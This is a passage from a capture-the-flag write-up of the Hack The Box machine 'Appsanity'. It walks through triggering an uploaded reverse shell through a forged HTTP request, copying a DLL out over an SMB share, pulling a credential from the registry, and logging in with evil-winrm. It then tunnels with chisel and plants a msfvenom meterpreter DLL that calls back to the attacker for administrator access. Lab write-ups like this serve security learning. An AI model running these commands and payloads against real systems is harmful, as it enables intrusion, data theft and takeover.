<input type="hidden" name="__VIEWSTATE" id="__VIEWSTATE" value="PkedwVeLHvfHOyMBhI8R3+2GFfQhQBzdegmhpXEF13IkXpIu21ZKu03tieFtS48uFrJqp0CDEYriw76UHhN4asdFp6R6os6aFaEudR56Oae0J7CccsR/tEaoLhOgjlxq37J3ONYZHMYk91aZgee4/wO1q//vuHnieDXPMgh2POtF+3oWDiVOHkryAkxa5GSq5vrkzbpwPbOyp0JUhPr2wXdXg5MeJBTB6NcWd5YezJcvj8Tz/W/XVBJkr355m+BhhhkekXA62BvjvJrCnDDggGsTmHF/FFn+AU/vhN093rqFH4GBETmuBaf3FmFMBu7POmNIbPtuxdudQTVIgD8IS51KcxFJZfzumBgXKOEfwEaw3mLx8H4cl6LiCmKDrLgqs3lTuuNVqoN0xf+E7RcUOeupxk/OnnifmcORe+M1DhjS81MZXv7X/BtL5KvvzA3h8HVGz1Y++EkhxATZaB582mads2vwmfFqKatB6vb7r9YydKLCcGpBBYzvGeJr9ePEqy4HwAz0IQvCCwa0ay9BqnIls0eAI8Aj0d1YFVjjeWAugiRSHnmRUN8ACuUpDcQxvrjk8c/V2RUq3l9ZIjY5C+6Frc72qhi2K6SiEiCowek7xTLmivTIp7PmVgW0j6HDnhvLxHnnDtzb/eyf+fe17V6TL3VPhDgEmekbN6By1T1rDEKuX+JCG+QDD79UWuci/Tlaw/krItPa+i7rzoIIvG0ojw7pLWgXfnSsinCDrR5s6FHXg5S6MR49M9eLBaEDprGJAlVltBPChM/iz9CcUNQMpKMbCw28owAFg5qxHlMizcmWQNPd6S48A0TuZN/+6TWkQ91EHXMlDosUH4C8u17E9pU9C74cbfQIEaQZXCmfF7OSR8caiuP+lQcf5Fbwnux4EELd+ruQTo05k552Va5nejlNlJdyu9d9CiEX1wnFnQ1a980Uac63GYD7zR1gLWo+XyRVXpAf+0g/lIIms9ANWxKUdKjiFReM0hNwCc/yYwLTNRPSWMhEISEWOD6Oo7yejUR+Sj98nRpNXq0k0vO5boU1Besv2LOevlTsLi7d9GjtV/tBT8zlz7yQ8rwNSxPT5VYU1zmHJDT1RyQygxQzQz/GlhRh8hq+QEOKKtm09PhzMEaUmvZLcxoXVXWeWhl6A8gmlF/z9NodRii4hoZa0PTHhs4q0RGJQjqSRPwznhkpTd3DHeLmaP19Dr1pQ8T02A0c9rCQVjBNdXxq3YA2DN4gWePAh5/AORlJta8TUEAdGBmRb6I+pCAwT79Owt4uY3/KhltlCkzufQYqGU6dMFBnkCGDchrz0JNaImO6clUiwZQW3mHjOGrLlpO/2HnviCllF/QXwbt/bozQFP5rpMVxUPWV2oCr0vK5KZ/8BTLFO/gzSblPH6HZpbpjZl0CfUmHHQhExw8Shdk6l4OzRZI/F2eUzAl8jawd8WWZVlMRC/aiEBwLUiEQWEomZBUeWA8J4ViXCzo5uUxMa838UsclGPSDhV6O6Wz+8u9UYA6HysfhIsPKBU3oaK4n4Npzu1Okcf962MvyFEl34w==" />

                        <tr>
                            <td>000000</td>
                            <td>Calicoss</td>
                            <td>0000000001</td>
                            <td>tt</td>
                            <td>ssssssss</td>
                            <td>1/1/0001</td>
                            <td><a href='ViewReport.aspx?file=d87fedd5-c8be-4624-a6dc-e8bc3e1aead9_Calico1.aspx' target="_blank">View Report</a></td>
                        </tr>
                 

            </tbody>
        </table>
    </form>
</body>
</html>
```

Next i could trigger the reverse shell using the follwing request
```
POST /Prescriptions/SendEmail HTTP/2
Host: portal.meddigi.htb
Cookie: .AspNetCore.Antiforgery.d2PTPu5_rLA=CfDJ8LlcnPjBNjtEgfDAy5zFqrdVy40oHSuABbhKlqugEHA98KcoeiiOib7pIVCLAVYvs_Kq9PD_ruFJulneiVktL04VQmFgKDTotzk2reBDJ6rTdH_mTCM9lNQTi2ghcG410mx8tEUTh9-KOq9PFSjti-c; access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1bmlxdWVfbmFtZSI6IjgiLCJlbWFpbCI6IkNhbGljbzJAbm9tYWlsIiwibmJmIjoxNjk4ODQ5NTI3LCJleHAiOjE2OTg4NTMxMjcsImlhdCI6MTY5ODg0OTUyNywiaXNzIjoiTWVkRGlnaSIsImF1ZCI6Ik1lZERpZ2lVc2VyIn0.0arv_VDhjBTkB8NfwqbdWtj5s7FHtotoPK5Af4P3ahw
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://portal.meddigi.htb/Prescriptions
Content-Type: application/x-www-form-urlencoded
Content-Length: 137
Origin: https://portal.meddigi.htb
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
Te: trailers

Email=calico%40nomail.com&Link=http%3A%2F%2F127.0.0.1%3A8080%2FViewReport.aspx%3Ffile%3Dd87fedd5-c8be-4624-a6dc-e8bc3e1aead9_Calico1.aspx
```

After running this request we'd get a reverse shell.


## Lateral Movement

When i first landed on the machine i was user **appsanity\svc_exampanel**, This user did not have any special permissions or anything. I ran Winpeas but that didn't show anything interesting either so the next step was looking for custom code that might give information on a new vulnerability to exploit or potentially credentials in files. After searching around i noticed that we had access to the ExaminationPanel directory in the web application files. here there was a DLL that seemed interesting called ExaminationManagement.dll. I setup an SMB server using impacket.

```
impacket-smbserver -smb2support exfil `pwd`
```

Then i uploaded the file using the following cmd command from within the shell

```
copy  C:\inetpub\ExaminationPanel\ExaminationPanel\bin\ExaminationManagement.dll   \\10.10.14.85\EXFIL\ExaminationManagement.dll
```

Next we opened up this file using dnspy and started examining the code. After searching through the code i found the following piece that looked interesting. it was the **RetrieveEncryptionKeyFromRegistry** function.

```
// ExaminationPanel.index
// Token: 0x06000017 RID: 23 RVA: 0x00002234 File Offset: 0x00000434
private string RetrieveEncryptionKeyFromRegistry()
{
	string result;
	try
	{
		using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\MedDigi"))
		{
			if (registryKey == null)
			{
				ErrorLogger.LogError("Registry Key Not Found");
				base.Response.Redirect("Error.aspx?message=error+occurred");
				result = null;
			}
			else
			{
				object value = registryKey.GetValue("EncKey");
				if (value == null)
				{
					ErrorLogger.LogError("Encryption Key Not Found in Registry");
					base.Response.Redirect("Error.aspx?message=error+occurred");
					result = null;
				}
				else
				{
					result = value.ToString();
				}
			}
		}
	}
	catch (Exception ex)
	{
		ErrorLogger.LogError("Error Retrieving Encryption Key", ex);
		base.Response.Redirect("Error.aspx?message=error+occurred");
		result = null;
	}
	return result;
}
```
This code snippet showed us that the encryption key was stored in **Software\MedDigi**. We can extract the password by querrying the key.

```
reg query HKLM\Software\MedDigi
```
![Credentials in registry key](/assets/img/Appsanity/Appsanity_08.png)

Now that we have these credentials its time find where we can use these. I did the net user command to give me a list of all accounts 

![Users](/assets/img/Appsanity/Appsanity_09.png)

After trying the credentials on different users i found out devdoc was a valid user.

```
evil-winrm -u devdoc -p '1g0tTh3R3m3dy!!' -i meddigi.htb
```

## Privilege escalation

When doing basic enumeration the first thing that comes to mind that might be suspicious is that the host is listening for TCP connections on a non common port **100**. 

![Port 100 open](/assets/img/Appsanity/Appsanity_10.png)

I decided to setup a reverse proxy using chisel to then connect to it on the server (our Kali machine) i did the following.

```
./chisel server --port 5000 --reverse
```

Next i run the following command on the client

```
./chisel client 10.10.14.85:5000 R:socks
```

now we could connect to the service using proxychains and we can see its an application called **Reports Management administrative console**

![Reports Management administrative console](/assets/img/Appsanity/Appsanity_11.png)


Seeing this name of the application i started looking if there were any files named the same way. I found the ReportManagemetn directory in the **Program Files** directory which is not a common application making it a good target to look into. In This directory there was also a directory called Libraries which contained a DLL called **externalupload.dll** that we had write permissions on. The DLL name made me think that it might have something to do with the upload function of the custom app we just discovered next i created a meterpreter DLL using msfvenom 

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=10.10.14.85 LPORT=4000 -k -f dll > externalupload.dll
```

Next i setup my meterpreter listener 
```
msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter_reverse_tcp;set LHOST tun0;set LPORT 4000;run;"
```

Next up I uploaded the dll to the libraries directory using curl

```
curl http://10.10.14.85/externalupload.dll -o externalupload.dll
```
![File uploaded](/assets/img/Appsanity/Appsanity_12.png)

Then after uploading the dll i trigged it by using the upload functionality through proxychains

![Chisel upload](/assets/img/Appsanity/Appsanity_13.png)

Then a few moments later we'll  be greated with a meterpreter shell as administrator

![Rooted](/assets/img/Appsanity/Appsanity_14.png)


